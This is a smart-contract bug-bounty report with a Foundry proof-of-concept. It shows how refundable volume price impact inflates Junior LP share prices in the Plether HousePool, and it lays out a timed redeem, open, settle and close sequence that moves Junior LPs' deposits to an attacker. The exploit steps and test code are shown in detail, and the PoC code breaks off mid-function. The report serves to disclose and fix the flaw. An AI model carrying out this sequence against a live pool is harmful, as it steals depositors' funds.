# \#98377 [SC-Critical] Refundable positive VPI is priced into Junior NAV during LP epoch settlement, leading to direct theft of Junior LP funds

**Submitted on Nov 7th 2026 at 13:56:13 UTC by @Abhan for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98377
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

A skew-increasing open pays a volume price impact (VPI) charge `V`, which the HousePool immediately books as realized Junior revenue. But when the same position closes and skew returns, the lifetime VPI clamp refunds `V`, less the close fee, to that position from pool cash. Every Junior redemption settled while such a position is open is therefore priced from a NAV inflated by money the pool still owes back, and the Junior LPs who remain pay for it when the refund leaves the pool. An unprivileged Junior LP who also trades can exploit this on purpose: queue a redemption, open at the skew cap after the request cutoff, let anyone settle the epoch, then close. The PoC uses release parameters, the production router and no price movement. In it, the attacker profits each cycle, and the honest Junior LP receives 799.92 fewer USDG for the same shares on a later, fully funded redemption. In production this is a permissionless, repeatable theft of deposited Junior LP funds. Even with no attacker, any Junior who redeems while a skewed position is open is overpaid at the remaining Juniors' expense.


## Vulnerability Details
When a trader opens a position that increases skew, the engine charges a VPI amount `V = vpiFactor · (S_post² − S_pre²) / (2D)`. `CfdEngineSettlementSidecar.executeOpen` forwards it to the HousePool as `Revenue` with `CashArrived`, and the pool adds it to `accountedAssets` immediately:

```solidity
// CfdEngineSettlementSidecar.sol L454-L464 (executeOpen)
if (delta.tradeCostAssets > 0) {
    uint256 poolCashInflowAssets = uint256(delta.tradeCostAssets) - protocolFeeCreditedAssets;
    if (poolCashInflowAssets > 0) {
        IHousePool(host.pool())
            .recordClaimantInflow(
                poolCashInflowAssets,
                IHousePool.ClaimantInflowKind.Revenue,
                IHousePool.ClaimantInflowCashMode.CashArrived
            );
    }
}
```

```solidity
// HousePool.sol L640-L642 (recordClaimantInflow)
if (cashMode == IHousePool.ClaimantInflowCashMode.CashArrived) {
    accountedAssets += amount;
}
```

From that moment, LP pricing treats `V` as Junior equity. `HousePoolAccountingLib.buildReconcileSnapshot` derives distributable LP equity only from physical assets, the terminal price delta and trader claims. It has no term for VPI that an open position can still reclaim:

```solidity
// HousePoolAccountingLib.sol L63-L76 (buildReconcileSnapshot)
uint256 terminalAssets = engineSnapshot.physicalAssets;
uint256 terminalLiabilities = engineSnapshot.traderClaimBalanceAssets;
int256 terminalDelta = engineSnapshot.terminalLpPriceDeltaAssets;
if (terminalDelta >= 0) {
    terminalAssets += uint256(terminalDelta);
} else {
    // This form also handles `type(int256).min` without negating it directly.
    terminalLiabilities += uint256(-(terminalDelta + 1)) + 1;
}

if (terminalAssets >= terminalLiabilities) {
    snapshot.distributable = terminalAssets - terminalLiabilities;
} else {
    snapshot.deficit = terminalLiabilities - terminalAssets;
}
```

At the next `settleLpEpoch`, `_reconcile` books the increase. The waterfall credits everything above Senior's entitlement to Junior (`HousePoolWaterfallAccountingLib.sol` L158: `nextState.juniorPrincipal += remaining;`), and the epoch's Junior redemptions are priced from that principal:

```solidity
// HousePool.sol L835-L840 (LP epoch settlement)
_reconcile(accountingSnapshot, statusSnapshot);
_checkpointEngineCarryIndexes();

result.cutoffEpoch = cutoffEpoch;
RedemptionPhase memory juniorPhase;
juniorPhase.pricingPrincipal = juniorPrincipal;
```

However, `V` has not been earned. When the same position later reduces skew, `CloseAccountingLib.buildCloseState` computes a negative VPI delta. The lifetime clamp limits that refund to what the position paid, but it does not cancel it:

```solidity
// CloseAccountingLib.sol L112-L118
// Clamp so lifetime VPI (accrued + delta) never goes negative. Prevents LP sandwich attacks
// where an attacker opens at high depth, reduces pool depth, then closes to extract a
// net-negative lifetime VPI rebate. This rule is identical in live and oracle-frozen markets; frozen-market
// stale-price risk is priced separately through frozenSpreadAssets.
if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
    state.vpiDeltaAssets = -state.proportionalAccrualAssets;
}
```

`CfdEnginePlanLib._planCloseActionSettlement` nets the close execution fee against this refund and records the remainder as an action rebate. That rebate is capped only by pool cash that is free of trader claims (`CfdEnginePlanLib.sol` L973-L978), and `_executeClose` pays it directly out of the pool:

```solidity
// CfdEnginePlanLib.sol L1041-L1061 (_planCloseActionSettlement)
int256 actionNetAssets = cs.vpiDeltaAssets
    + int256(
        cs.executionFeeAssets + cs.frozenSpreadAssets + delta.pendingCarryAssets - delta.realizedCarryAssets
    );
...
} else if (actionNetAssets < 0) {
    delta.actionRebateAssets = uint256(-actionNetAssets);
}
```

```solidity
// CfdEngineSettlementSidecar.sol L621-L624 (_executeClose)
if (delta.actionRebatePaidAssets > 0) {
    IHousePool(host.pool()).payOut(address(clearinghouse), delta.actionRebatePaidAssets);
    clearinghouse.settleAssets(delta.account, int256(delta.actionRebatePaidAssets));
}
```

So for the whole life of the position, Junior NAV contains an amount the pool will hand back. Anyone whose Junior redemption settles in that window is paid a share of it, and the Junior LPs who stay fund the refund. Let Junior equity be `J` before the open and the redeemer's share be `f`, and ignore carry, which is negligible over a few minutes. The accounting then runs as follows:

| Step | Pool cash | Junior NAV |
| --- | --- | --- |
| Open: the position pays `V` (the open fee goes to the treasury) | `+V` | `J + V` |
| Epoch settles and the redeemer exits | `−f·(J + V)` | `(1 − f)·(J + V)` |
| Close: the clamp refunds `V − closeFee` | `−(V − closeFee)` | `(1 − f)·J − f·V + closeFee` |

Compared with no trade, the redeemer ends `f·V` richer and the remaining Juniors end `f·V − closeFee` poorer.

This happens passively: any honest Junior who redeems while any trader's skew-increasing position is open is overpaid. It can also be done deliberately by a Junior LP who is also the trader. Such an LP collects `f·V` on the LP leg, while its trading leg costs only the two execution fees: it pays `V + openFee` and gets `V − closeFee` back. Its net gain is `f·V − openFee − closeFee`. The remaining Juniors lose that gain plus the open fee, which went to the treasury.

The deliberate path uses only public, permissionless calls. Early in an LP epoch, the attacker requests a redemption of its Junior shares, which locks the request to the next hour boundary. The shares can be bought just for this, because Junior deposits are uncapped: `TrancheVault.maxRequestDeposit` returns `type(uint256).max` for Junior. After the epoch's 300-second request cutoff, the attacker submits a skew-increasing open up to the `maxSkewRatio` cap through `router.commitOrder(OrderRequest)`, and any keeper executes it. Other Juniors who react can only queue for the following epoch. At the boundary anyone calls `router.settleLpEpoch`. The attacker claims its redemption, priced with `V` inside Junior NAV, and then closes. The close reduces skew, so it is always admissible, and the clamp refunds `V − closeFee` from pool cash.

Nothing interrupts the sequence. `NoLpEpochProgress` does not fire, because a request is queued. The rebate is far below free pool cash, so nothing is waived. Degraded mode is not reached, and the posted margin is returned on close.

The protocol already applies the right rule to the opposite sign. The negative-VPI reserve "is excluded from the terminal price curve, so LPs cannot withdraw it as marked equity before the matching position obligation settles" (WHITEPAPER L887-L888). The public trading-costs page also calls an open-time rebate "provisional", because it "may be reclaimed when that exposure closes". Positive VPI is the mirror case: cash the pool holds now but owes back if skew reverses. Yet it gets no matching exclusion, so Junior LPs who exit while it is in NAV take part of it with them.


## Impact Details
The funds at risk are the Junior LPs' USDG deposits held by `HousePool`. The bug moves that principal from the Junior LPs who stay in the pool to whoever redeems while a skew-increasing position is open, and an attacker can arrange to be that redeemer. This is the in-scope Critical impact "Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield". What the honest LP loses is deposited capital, not yield, and it ends up with the attacker.

All figures below come from the attached PoC. It runs with the release parameters from `DEPLOYMENT.md`, sends trades through the production V3 router, holds the price constant, and compares each attack against a no-attack control started from the same snapshot on the same clock.

In the base case the pool holds 4,000,000 Senior and 6,000,000 Junior. The attacker owns 3,600,000 of the Junior (f ≈ 0.60) and an honest LP owns 2,400,000. The attacker opens 4,000,000 of notional at the 40% skew cap and pays V = 7,999.9984 USDG. Its redemption settles 4,799.998241 USDG higher than in the control, which is exactly f·V. On close, it gets V − closeFee = 6,399.9984 back in full. After both execution fees and 0.50 of carry, the attacker gains 1,599.49 USDG from a single cycle with a position held for about three minutes. The honest Junior loses 3,199.69 USDG, and Senior is unaffected.

The loss shows up in tokens actually paid out, not only in share price. Later, the honest Junior redeems the same quarter of its shares in both branches through the public `requestRedeem`, `settleLpEpoch` and `claimRedeem` path, and both requests are fully funded. Its wallet receives 599,979.907408 USDG in the control and 599,179.984192 USDG after the attack: 799.923216 USDG less for identical shares. The remaining 2,399.77 is lost on the shares it still holds.

The attacker needs capital, not an existing large share, because Junior deposits are uncapped. Take an honest pool of 6,000,000 Senior and 4,000,000 Junior. An attacker who deposits 14,000,000 of fresh Junior capital gains 7,252.40 USDG per cycle, while the honest Junior loses 11,092.59 USDG, or 0.277% of its deposit. In an existing pool split 60% Senior and 40% Junior, the Junior-withdrawal covenant limits the attacker to just over 62% of Junior. At that share the attacker still gains 1,779.49 and the honest Junior loses 3,379.69 (0.224%). At the widest oracle confidence the protocol accepts, which shifts the execution price against the attacker on both legs, the base case still nets the attacker 197.09 while the honest Junior loses 1,796.89. The competition scope states that a high capital requirement alone does not lower severity.

In general the attacker earns about (20f − 8) bps of the skew-cap notional per cycle, so at zero confidence the attack pays from roughly f = 0.40 upward. The other Juniors always lose the attacker's gain plus the open fee, so below break-even the attack still works as griefing: at f = 0.30 the attacker loses 800.50 and the honest Junior still loses 799.70. The cycle can be repeated, because a fresh Junior deposit can be activated, wait out its cooldown and be redeemed with full funding within three hours.

No attacker is needed for honest LPs to lose. If any trader holds a skew-increasing position across an LP settlement, every Junior redemption in that epoch is overpaid by its share of that trader's refundable VPI. At the release skew cap that is up to 8 bps of pool depth, and the Juniors who stay pay it back when the trader closes. In the PoC, an honest LP holding 60% of Junior redeems and receives 4,799.998241 more than with no trade, and the remaining Junior ends 3,199.69 worse off.

## Recommendation

Treat the positive lifetime VPI of open positions as a contingent liability in LP pricing until the clamp can no longer return it. Either:

- subtract `Σ max(vpiAccrued, 0)` over open positions, or a per-side aggregate maintained on open, close and liquidation, from `distributable` in `HousePoolAccountingLib.buildReconcileSnapshot`; or
- route positive VPI into a dedicated impact reserve that is excluded from LP pricing, mirroring the exclusion already applied to the negative-VPI reserve. Release the unrefunded part to LP revenue when the position closes or is liquidated.


## References


- VPI booked as pool revenue at open: [CfdEngineSettlementSidecar.sol#L454-L464](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol?plain=1#L454-L464)
- LP equity has no refundable-VPI term: [HousePoolAccountingLib.sol#L63-L77](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolAccountingLib.sol?plain=1#L63-L77)
- Junior redemptions priced from the inflated principal: [HousePool.sol#L835-L840](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol?plain=1#L835-L840)
- Lifetime VPI clamp caps the refund at V but does not cancel it: [CloseAccountingLib.sol#L112-L118](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol?plain=1#L112-L118)
- VPI refund turned into an action rebate: [CfdEnginePlanLib.sol#L1041-L1061](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol?plain=1#L1041-L1061)
- Rebate paid out of the pool: [CfdEngineSettlementSidecar.sol#L621-L624](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol?plain=1#L621-L624)


## Proof of Concept

## Proof of Concept

The vulnerability is demonstrated by a runnable Foundry test against the audit repository, `immunefi-team/audit-comp-plether` at commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`. The complete test code is included at the end of this section.

The test extends the repository's own `BasePerpTest` harness (`packages/perps/test/perps/BasePerpTest.sol`) and does not modify any contract under `src/`. The only mocks are the repository's Pyth and USDG test contracts. `BasePerpTest` deploys the repository's `LegacyOrderRouterHarness`, which inherits the production `OrderRouter` unchanged and only adds a test-only scalar commit overload that this test never calls. Every trade goes through the production V3 entry point `IPerpsTraderActions.commitOrder(OrderRequest)` and is executed by an arbitrary keeper address. Every LP deposit and redemption uses the public request → `router.settleLpEpoch` → claim flow, and no protocol contract is impersonated.

The test applies the release parameters from `DEPLOYMENT.md`: `vpiFactor` 0.01e18, `maxSkewRatio` 0.4, 4 bps execution fee, 20/10 bps margins, 10 bps maximum confidence, 2,500 bps adverse multiplier, Senior cap 40M/80% and 1 USDG seeds. Each attack is compared with a no-attack control that starts from the same EVM snapshot and follows the same clock. The price stays at 1.00 throughout.

### Step-by-step (`test_Deliberate_AttackerProfits_VictimReceivesLessUsdg`)

1. **Setup.** An honest LP deposits 2,400,000 Junior, the attacker deposits 3,600,000 Junior (`f ≈ 0.60`) and a Senior LP deposits 4,000,000, all through the public async deposit flow. Pool depth `D` = 10,000,002. The clock moves to an epoch boundary `e`.
2. **`e + 60 s`:** the attacker calls `juniorVault.requestRedeem` for all its Junior shares. The request matures at `e + 3600`.
3. **`e + 3480`** (120 s before maturity, after the 300 s request cutoff): the attacker commits a LONG open of 40,000 lots (`N` = 4,000,000 USDG) with 40,000 USDG margin, and a keeper executes it. The position pays `V` = 7,999.9984 USDG of VPI (= 0.01 · 4,000,000² / (2 · 10,000,002)) plus a 1,600 USDG open fee to the treasury. Junior `totalAssets` rises from 5,999,892.64 to 6,007,892.63. An order one lot larger is rejected with `OpenRevertCode` 4 `SKEW_TOO_HIGH`, read from the authenticated order receipt.
4. **`e + 3600`:** a third party calls `router.settleLpEpoch`, and the attacker claims its redemption. It receives 3,604,734.244805 USDG, against 3,599,934.246564 in the control: +4,799.998241, which is `f·V`.
5. **Close:** the attacker closes the full position at the same price. Pool depth is now 6,403,267.75, so the uncapped close VPI would be 12,493.62. The clamp limits it, and the emitted `ActionRebateSettled` shows 6,399.9984 assessed, 6,399.9984 paid and 0 waived. That is exactly `V − closeFee`.
6. **Later:** the honest LP requests redemption of a quarter of its shares, the next epoch settles, and it claims. Both branches fully fund this request. Its wallet receives 599,979.908423 USDG in the control and 599,179.985207 USDG after the attack: **799.923216 USDG less** for identical shares.
7. **Result vs control:** attacker **+1,599.494196** USDG; honest Junior **−3,199.692865** USDG (the realized shortfall plus 2,399.77 on its remaining shares); Senior unchanged; treasury +1,600.

### Other scenarios covered by the test

| Test | What it shows | Result |
| --- | --- | --- |
| `test_Deliberate_AtMaxAcceptedConfidence` | Same cycle with every feed at the 10 bps confidence ceiling | Attacker +197.09, honest Junior −1,796.89 |
| `test_FreshCapital_AttackerDepositsIntoHonestPool` | Honest pool of 6M Senior / 4M Junior; attacker deposits 14M fresh Junior | Attacker +7,252.40, honest Junior −11,092.59 (0.277%) |
| `test_SeniorCovenantBoundShare` | 60/40 pool, attacker at the covenant-bound share (`f ≈ 0.62`) | Attacker +1,779.49, honest Junior −3,379.69 |
| `test_BelowBreakEven_VictimStillLoses` | `f = 0.30` | Attacker −800.50, honest Junior still −799.70 |
| `test_Passive_HonestRedeemerOverpaid_RemainingJuniorPays` | No attacker: an unrelated trader's position is open while an honest Junior redeems | Redeemer +4,799.998241, remaining Junior −3,199.69 |
| `test_RefundIndependentOfRedemption` | Refund with and without the redemption | 6,393.60 vs 6,399.9984 (the clamp caps it at `V − fee`) |
| `test_CycleTiming` | Fresh deposit → cooldown → funded redemption; a request made after the cutoff | Funded redemption at `e0 + 10,800 s`; a late request lands one epoch later |

Setting `vpiFactor` to 0 in the test's `_riskParams()` removes the effect entirely. The redemption uplift becomes 0, the attacker loses its two fees (−3,200.50) and the honest Junior is unaffected. The test's VPI assertions then fail by design.

### How to run

```bash
git clone https://github.com/immunefi-team/audit-comp-plether.git
cd audit-comp-plether
git checkout a82d4fefb02768e5b3bddcc97dee371eee24fea8
git submodule update --init --recursive
mkdir -p packages/perps/test/poc
# save the test code below as packages/perps/test/poc/PositiveVpiJuniorNav.t.sol
cd packages/perps
FOUNDRY_TEST=test/poc FOUNDRY_SCRIPT=test/poc forge test --match-path test/poc/PositiveVpiJuniorNav.t.sol -vv
```

The two `FOUNDRY_*` variables limit compilation to the PoC. The package builds with via-IR, so compiling its whole test suite takes much longer; running without them also works. Expected result: `Suite result: ok. 8 passed; 0 failed; 0 skipped`, with the values above in the logs.

### PoC code

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";
import {CfdEnginePlanTypes} from "@plether/perps/CfdEnginePlanTypes.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {ICfdEngineSettlementSidecar} from "@plether/perps/interfaces/ICfdEngineSettlementSidecar.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {IPerpsTraderActions} from "@plether/perps/interfaces/IPerpsTraderActions.sol";
import {Vm} from "forge-std/Vm.sol";
import {console2} from "forge-std/console2.sol";

/// @title Positive VPI is priced into Junior NAV while it is still refundable to the trader
/// @notice A skew-increasing open pays VPI `V` into the HousePool as Revenue. Junior share price includes `V`
///         immediately, but the lifetime VPI clamp refunds `V` (minus the close fee) to the same position when it
///         closes and skew returns. A Junior redemption settled in between is paid a pro-rata share of `V` that the
///         remaining Junior LPs fund when the refund leaves the pool.
/// @dev Every trade enters through the production V3 `IPerpsTraderActions.commitOrder(OrderRequest)` and is executed
///      by an untrusted keeper call. LP epochs settle through the permissionless `router.settleLpEpoch`. Release
///      parameters from `packages/perps/DEPLOYMENT.md`. Each attack is compared against a no-attack control that
///      starts from the same EVM snapshot and follows the same clock.
contract PositiveVpiJuniorNavTest is BasePerpTest {

    address internal constant ATTACKER = address(0xA11CE); // Junior LP who also trades
    address internal constant VICTIM = address(0xB0B); // honest Junior LP who stays in the pool
    address internal constant SENIOR_LP = address(0x5E1);
    address internal constant OTHER_TRADER = address(0x7EAD); // unrelated trader (passive variant)

    uint256 internal constant PRICE = 1e8; // basket 1.00, unchanged for the whole test
    uint256 internal constant LOT = 1e20; // positionSizeQuantum: 100 synthetic tokens
    uint256 internal constant TRADER_CASH = 200_000e6;
    uint256 internal constant MAX_CONF = PRICE * 10 / 10_000; // basketMaxConfidenceRatioBps = 10 (accepted, not >)

    bytes32 internal constant ACTION_REBATE_TOPIC = ICfdEngineSettlementSidecar.ActionRebateSettled.selector;

    /// @dev When the honest Junior is pinned at the Junior-withdrawal covenant it can barely redeem; measure share value.
    bool internal victimValueOnly;

    struct Plan {
        bool trade; // false = no-attack control
        bool redeem; // false = nobody redeems while the position is open
        address redeemer; // Junior LP whose full redemption settles while the position is open
        address trader; // account that opens and later closes the position
        uint256 conf; // per-feed Pyth confidence (0 or MAX_CONF)
    }

    struct Result {
        uint256 depthAtOpen; // pool.totalAssets() before the open
        uint256 notional; // N, USDG
        uint256 vpiCharged; // V, USDG (position.vpiAccrued after the open)
        uint256 treasuryOpenFee; // treasury delta caused by the open
        uint256 juniorAssetsBeforeOpen;
        uint256 juniorAssetsAfterOpen;
        uint256 redeemerUsdg; // USDG actually received for the full redemption
        uint256 depthAtClose; // pool.totalAssets() right before the close
        uint256 rebateAssessed; // ActionRebateSettled.assessedAssets on the close
        uint256 rebatePaid;
        uint256 rebateWaived;
        int256 traderPnl; // clearinghouse balance change of the trader over the open+close round trip
        uint256 victimClaimUsdg; // USDG received by VICTIM on a later, fully funded quarter redemption
        uint256 victimResidualValue; // convertToAssets of VICTIM's remaining shares after that claim
        uint256 seniorAssets;
        uint256 treasury;
    }

    // ------------------------------------------------------------------------------------------------------------
    // Release configuration
    // ------------------------------------------------------------------------------------------------------------

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function setUp() public override {
        super.setUp();
        _setSeniorCapacity(40_000_000e6, 8000);
        IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
        config.adverseConfidenceMultiplierBps = 2500;
        _setRouterConfig(config);
        // The timelock warps above end inside the weekend market closure; resume on the next Monday 10:00 UTC.
        vm.warp(SETUP_TIMESTAMP + 7 days);
        assertFalse(engine.isOracleFrozen(), "regular trading hours");
        assertEq(engine.executionFeeBps(), 4, "release execution fee");
        assertEq(engine.settlementBufferBps(), 25, "release settlement buffer");
        assertEq(router.pletherOracle().basketMaxConfidenceRatioBps(), 10, "release confidence cap");
        assertEq(router.pletherOracle().adverseConfidenceMultiplierBps(), 2500, "release adverse multiplier");
    }

    function _seedLps(
        uint256 senior,
        uint256 attackerJunior,
        uint256 victimJunior
    ) internal {
        // Junior first: Senior capacity is bounded by maxSeniorShareBps (80%) of the tranche total.
        _publicDeposit(juniorVault, VICTIM, victimJunior);
        _publicDeposit(juniorVault, ATTACKER, attackerJunior);
        _publicDeposit(seniorVault, SENIOR_LP, senior);
        // Leave every deposit cooldown behind and start on a fresh hourly epoch boundary.
        vm.warp(((vm.getBlockTimestamp() / 3600) + 2) * 3600);
    }

    /// @dev Public async deposit: requestDeposit -> permissionless router.settleLpEpoch -> claimDeposit.
    function _publicDeposit(
        TrancheVault vault,
        address lp,
        uint256 amount
    ) internal {
        settlementToken.mint(lp, amount);
        vm.startPrank(lp);
        settlementToken.approve(address(vault), amount);
        uint256 requestId = vault.requestDeposit(amount, lp, lp);
        vm.stopPrank();
        vm.warp(vault.depositEpochStart(requestId));
        _settleEpoch();
        assertEq(vault.claimableDepositRequest(requestId, lp), amount, "deposit activated in full");
        vm.prank(lp);
        vault.claimDeposit(requestId, amount, lp, lp);
    }

    // ------------------------------------------------------------------------------------------------------------
    // Production entry points
    // ------------------------------------------------------------------------------------------------------------

    function _commit(
        address account,
        uint256 size,
        uint256 margin,
        uint256 targetPrice,
        bool isClose
    ) internal returns (uint64 orderId) {
        uint256 window = router.maxExecutionWindowSeconds();
        OrderV3Types.OrderRequest memory request = OrderV3Types.OrderRequest({
            clientOrderId: keccak256(abi.encode(account, router.nextCommitId())),
            side: CfdTypes.Side.LONG,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: targetPrice,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(vm.getBlockTimestamp() + window),
                executionWindowSeconds: uint32(window),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
        vm.prank(account);
        orderId = IPerpsTraderActions(address(router)).commitOrder(request);
    }

    /// @dev Same as BasePerpTest._mockPythUpdateData but with a per-feed Pyth confidence.
    function _pyth(
        uint256 conf
    ) internal returns (bytes[] memory updateData) {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        uint256 publishTime = _mockHistoricalPublishTime();
        baseMockPyth.setAllUniquePrices(
            _basePythFeedIds(),
            SafeCast.toInt64(SafeCast.toInt256(PRICE)),
            SafeCast.toUint64(conf),
            int32(-8),
            publishTime,
            publishTime == 0 ? 0 : publishTime - 1
        );
        updateData = new bytes[](1);
        updateData[0] = abi.encode(PRICE);
    }

    function _keeperExecute(
        uint256 conf
    ) internal {
        vm.prank(address(0xBEEF)); // untrusted keeper
        router.executeOrder(router.nextExecuteId(), _pyth(conf));
    }

    function _settleEpoch() internal {
        vm.prank(address(0xBEEF)); // permissionless
        router.settleLpEpoch(_pyth(0));
    }

    function _positionSize(
        address account
    ) internal view returns (uint256 size) {
        (size,,,,,,) = engine.positions(account);
    }

    /// @dev Largest whole-lot LONG size whose notional at 1.00 stays within maxSkewRatio (40%) of current depth.
    function _skewCapSize() internal view returns (uint256) {
        uint256 maxNotional = pool.totalAssets() * 4 / 10;
        return (maxNotional * 1e12 / LOT) * LOT;
    }

    // ------------------------------------------------------------------------------------------------------------
    // Scenario driver
    // ------------------------------------------------------------------------------------------------------------

    /// 1. `redeemer` requests a full Junior redemption 60 s into an epoch (matures at the next hour boundary).
    /// 2. 120 s before maturity, after the 300 s request cutoff, `trader` opens LONG at the 40% skew cap.
    /// 3. At maturity anyone settles the epoch; the redemption is priced while the position is open.
    /// 4. `trader` closes the whole position at the same price.
    /// 5. VICTIM later redeems a fixed quarter of its shares in a fully funded epoch (same clock in every branch).
    function _run(
        Plan memory p
    ) internal returns (Result memory r) {
        vm.warp(vm.getBlockTimestamp() + 60);
        uint256 maturity = (vm.getBlockTimestamp() / 3600 + 1) * 3600;
        uint256 redeemId;
        uint256 shares;
        if (p.redeem) {
            shares = juniorVault.balanceOf(p.redeemer);
            vm.prank(p.redeemer);
            redeemId = juniorVault.requestRedeem(shares, p.redeemer, p.redeemer);
            assertEq(juniorVault.depositEpochStart(redeemId), maturity, "redemption matures at the next hour");
        }

        uint256 size;
        uint256 traderStart;
        if (p.trade) {
            vm.warp(maturity - 120);
            _fundTrader(p.trader, TRADER_CASH);
            traderStart = clearinghouse.balanceAssets(p.trader);
            uint256 treasuryBefore = clearinghouse.balanceAssets(engine.protocolTreasury());
            r.depthAtOpen = pool.totalAssets();
            r.juniorAssetsBeforeOpen = juniorVault.totalAssets();
            size = _skewCapSize();
            r.notional = size * PRICE / 1e20;

            // Sanity: at the unshifted price one more lot is beyond the skew cap and does not open.
            // (With a confidence shift the LONG open executes slightly below 1.00, so the same size is under the cap.)
            if (p.conf == 0) {
                uint256 snap = vm.snapshotState();
                _startRecordingLogs();
                uint64 tooBig = _commit(p.trader, size + LOT, r.notional / 100, 0.99e8, false);
                _keeperExecute(p.conf);
                assertEq(_positionSize(p.trader), 0, "one lot above the skew cap must not open");
                OrderV3Types.OrderReceipt memory receipt = _verifiedReceipt(router.lifecycleBook(), tooBig);
                console2.log("one-lot-over open: failure code", receipt.failure.code);
                assertEq(
                    receipt.failure.code,
                    uint8(CfdEnginePlanTypes.OpenRevertCode.SKEW_TOO_HIGH),
                    "rejected by the skew cap (not margin or solvency headroom)"
                );
                vm.revertToState(snap);
            }

            _commit(p.trader, size, r.notional / 100, 0.99e8, false); // 1% margin
            _keeperExecute(p.conf);
            (uint256 posSize,,,,,, int256 vpiAccrued) = engine.positions(p.trader);
            assertEq(posSize, size, "open at the skew cap must execute");
            assertGt(vpiAccrued, 0, "skew-increasing open pays positive VPI");
            r.vpiCharged = uint256(vpiAccrued);
            r.treasuryOpenFee = clearinghouse.balanceAssets(engine.protocolTreasury()) - treasuryBefore;
            r.juniorAssetsAfterOpen = juniorVault.totalAssets();
        }

        vm.warp(maturity);
        if (p.redeem) {
            _settleEpoch(); // reverts NoLpEpochProgress when nothing is queued, so only when a request exists
            assertEq(juniorVault.claimableRedeemRequest(redeemId, p.redeemer), shares, "redemption fully funded");
            uint256 before = settlementToken.balanceOf(p.redeemer);
            vm.prank(p.redeemer);
            juniorVault.claimRedeem(redeemId, shares, p.redeemer, p.redeemer);
            r.redeemerUsdg = settlementToken.balanceOf(p.redeemer) - before;
        }

        if (p.trade) {
            r.depthAtClose = pool.totalAssets();
            vm.recordLogs();
            _commit(p.trader, size, 0, type(uint256).max, true);
            _keeperExecute(p.conf);
            assertEq(_positionSize(p.trader), 0, "full close must execute");
            Vm.Log[] memory logs = vm.getRecordedLogs();
            for (uint256 i; i < logs.length; ++i) {
                if (
                    logs[i].topics.length == 2 && logs[i].topics[0] == ACTION_REBATE_TOPIC
                        && logs[i].topics[1] == bytes32(uint256(uint160(p.trader)))
                ) {
                    (r.rebateAssessed, r.rebatePaid, r.rebateWaived) =
                        abi.decode(logs[i].data, (uint256, uint256, uint256));
                }
            }
            r.traderPnl = int256(clearinghouse.balanceAssets(p.trader)) - int256(traderStart);
        }

        vm.warp(vm.getBlockTimestamp() + 60);
        if (!victimValueOnly) {
            uint256 quarter = juniorVault.balanceOf(VICTIM) / 4;
            vm.prank(VICTIM);
            uint256 victimId = juniorVault.requestRedeem(quarter, VICTIM, VICTIM);
            vm.warp(juniorVault.depositEpochStart(victimId));
            _settleEpoch();
            assertEq(juniorVault.claimableRedeemRequest(victimId, VICTIM), quarter, "victim quarter fully funded");
            uint256 victimBefore = settlementToken.balanceOf(VICTIM);
            vm.prank(VICTIM);
            juniorVault.claimRedeem(victimId, quarter, VICTIM, VICTIM);
            r.victimClaimUsdg = settlementToken.balanceOf(VICTIM) - victimBefore;
        } else {
            vm.warp((vm.getBlockTimestamp() / 3600 + 1) * 3600); // same measurement clock in both branches
        }
        r.victimResidualValue = juniorVault.convertToAssets(juniorVault.balanceOf(VICTIM));
        r.seniorAssets = seniorVault.totalAssets();
